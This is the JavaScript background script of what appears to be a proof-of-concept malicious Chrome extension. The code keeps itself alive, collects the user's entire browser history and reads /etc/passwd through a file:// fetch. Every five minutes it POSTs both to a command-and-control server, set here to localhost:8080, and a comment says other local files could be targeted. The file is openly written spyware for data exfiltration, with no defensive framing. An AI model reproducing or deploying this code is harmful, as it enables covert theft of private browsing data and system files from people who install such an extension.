const keepAlive = () => setInterval(chrome.runtime.getPlatformInfo, 20e3);
chrome.runtime.onStartup.addListener(keepAlive);
keepAlive();

// Send data to C2. Takes in String / json object?
function exfil(data) {
    fetch("http://localhost:8080/", {
    //fetch("https://localhost:8080/", {
        method: "post",
        headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
        },
        // data should be json.
        body: data
    })
}


// Requires permission scope for 'history' in manifest.json.
// Fetches browser history and shares with C2.
// Ref doc: https://developer.chrome.com/docs/extensions/reference/history/
function getBrowserHistory() { 
    chrome.history.search({text: ""}, function(historyItems){
        var history = [];
        for (var i = 0; i < historyItems.length; ++i) {
            history.push(historyItems[i].url); 
        }
        exfil(JSON.stringify({"browser_history": history}));
    });
}

// getLocalFile
// This is currnetly fetching /etc/passwd and shares with C2.
// Could be changed to other files. File paths needs to be known.
function getLocalFile() {
    fetch("file:///etc/passwd").
    then((res) => res.text())
    .then((text) => {
        exfil(JSON.stringify({"/etc/passwd_content": text}));
    })
}

// Interval is 1000ms*60sec*x min
const history_interval = 1000*60*5;
setInterval(getBrowserHistory, history_interval);
setInterval(getLocalFile, history_interval);

